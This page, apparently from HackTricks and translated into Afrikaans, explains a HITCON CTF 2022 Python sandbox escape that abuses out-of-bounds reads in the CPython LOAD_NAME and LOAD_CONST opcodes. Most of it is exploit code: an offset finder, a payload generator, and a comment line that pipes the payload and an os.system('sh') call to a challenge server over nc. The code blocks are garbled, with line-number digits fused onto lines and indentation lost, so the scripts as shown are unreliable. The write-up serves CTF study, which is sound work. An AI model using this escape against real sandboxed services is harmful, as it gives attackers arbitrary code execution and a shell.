# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie inligting is geneem** [**uit hierdie skrywe**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ons kan die OOB leesfunksie in LOAD_NAME / LOAD_CONST opcode gebruik om 'n simbool in die geheue te kry. Dit beteken om 'n truuk soos `(a, b, c, ... honderde simbole ..., __getattribute__) if [] else [].__getattribute__(...)` te gebruik om 'n simbool (soos funksienaam) te kry wat jy wil hê.

Dan maak net jou ontploffing.

### Oorsig <a href="#overview-1" id="overview-1"></a>

Die bronkode is redelik kort, bevat slegs 4 lyne!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
U kan willekeurige Python-kode invoer, en dit sal gecompileer word na 'n [Python-kode objek](https://docs.python.org/3/c-api/code.html). egter `co_consts` en `co_names` van daardie kode objek sal vervang word met 'n leë tupel voordat daardie kode objek geëvalueer word.

So op hierdie manier, sal alle uitdrukkings wat konstantes bevat (bv. getalle, strings ens.) of name (bv. veranderlikes, funksies) uiteindelik 'n segmentasiefout kan veroorsaak.

### Uit die Grens Lees <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Hoe gebeur die segfault?

Kom ons begin met 'n eenvoudige voorbeeld, `[a, b, c]` kan in die volgende bytecode gecompileer word.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Maar wat as die `co_names` 'n leë tuple word? Die `LOAD_NAME 2` opcode word steeds uitgevoer, en probeer om waarde van daardie geheue adres te lees waar dit oorspronklik behoort te wees. Ja, dit is 'n out-of-bound lees "kenmerk".

Die kernkonsep vir die oplossing is eenvoudig. Sommige opcodes in CPython, byvoorbeeld `LOAD_NAME` en `LOAD_CONST`, is kwesbaar (?) vir OOB lees.

Hulle haal 'n objek uit indeks `oparg` van die `consts` of `names` tuple (dit is wat `co_consts` en `co_names` onder die oppervlak genoem word). Ons kan na die volgende kort snippest oor `LOAD_CONST` verwys om te sien wat CPython doen wanneer dit na die `LOAD_CONST` opcode verwerk.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Op hierdie manier kan ons die OOB-funksie gebruik om 'n "naam" van arbitrêre geheue-offset te verkry. Om seker te maak watter naam dit het en wat sy offset is, hou net aan om `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... te probeer. En jy kan iets vind in ongeveer oparg > 700. Jy kan ook probeer om gdb te gebruik om na die geheue-indeling te kyk, natuurlik, maar ek dink nie dit sal makliker wees nie?

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sodra ons daardie nuttige offsets vir name / consts verkry, hoe _kry_ ons 'n naam / const van daardie offset en gebruik dit? Hier is 'n truuk vir jou:\
Kom ons neem aan ons kan 'n `__getattribute__` naam van offset 5 (`LOAD_NAME 5`) met `co_names=()` verkry, doen dan net die volgende dinge:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Let op dat dit nie nodig is om dit as `__getattribute__` te noem nie, jy kan dit as iets korter of meer vreemd noem

Jy kan die rede agterkom deur net na die bytecode te kyk:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Let op dat `LOAD_ATTR` ook die naam van `co_names` haal. Python laai name vanaf dieselfde offset as die naam dieselfde is, so die tweede `__getattribute__` word steeds van offset=5 gelaai. Deur hierdie kenmerk kan ons 'n arbitrêre naam gebruik sodra die naam in die geheue naby is.

Vir die generering van getalle behoort dit triviaal te wees:

- 0: nie \[\[]]
- 1: nie \[]
- 2: (nie \[]) + (nie \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Ek het nie consts gebruik nie weens die lengte beperking.

Eerstens hier is 'n skrip vir ons om daardie offsets van name te vind.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
En die volgende is vir die generering van die werklike Python exploit.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Dit doen basies die volgende dinge, vir daardie strings kry ons dit van die `__dir__` metode:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{{#include ../../../banners/hacktricks-training.md}}
